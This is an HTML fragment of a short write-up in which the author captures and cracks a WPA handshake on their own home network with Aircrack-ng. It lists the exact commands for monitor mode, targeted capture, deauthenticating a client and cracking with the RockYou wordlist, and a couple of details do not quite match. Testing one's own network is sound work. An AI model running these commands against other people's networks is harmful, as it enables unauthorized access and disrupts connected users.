              <br>
              <p>For this test I attempted to capture and crack a WPA Handshake on my home network using the tools in question.</p>
              <h4>Steps Taken:</h4>
              <ol><li>I put my Network Interface into monitor mode</li>
                  <li>I used Airmon-ng with no arguments to get basic information about nearby networks. </li>
                  <li> I started monitoring traffic so that the WPA handshake would be captured the next time someone connects to the router.</li>
                  <li>For testing purposes, I choose to de-authenticate my phone from the network.</li>
                  <li>The handshake was captured, so I was able to stop monitoring. I chose to search the RockYou Wordlist for a matching hash to the one I'd captured.</li>
              </ol>
              <br>
          <h4>Variables:</h4>
      <p>ACCESSPOINTMAC: The BSSID/MAC Address of the target network in question</p>
      <p>CAPTUREFILE: The project name that you want to save your capture files under</p>
      <p>NIC: The name of your Network Adapter</p>
      <p>NICMON: Same as previous with mon appended to it</p>
      <p>TARGET: The MAC Address of the device you want to de-authenticate</p>
      <br>
      <h4>Commands Used:</h4>
       <ol>
           <li>sudo airmon-ng start NIC </li>
          <li>sudo airodump-ng NICMON</li>
          <li>sudo airodump-ng -c 6 -w CAPTUREFILE --bssid ACCESSPOINTMAC NICMON</li>
          <li>sudo aireplay-ng --deauth 2 -a ACCESSPOINTMAC -k TARGET NICMON</li>
          <li>sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt CAPTUREFILE.cap</li>
        </ol>
      <br>
      <p>Conclusion: The Aircrack-ng Suite is fairly easy to use for those with basic knowledge of networking and performs as expected. I've published a bash script that automates the actions taken in this test. <br> <br> <br> </p>
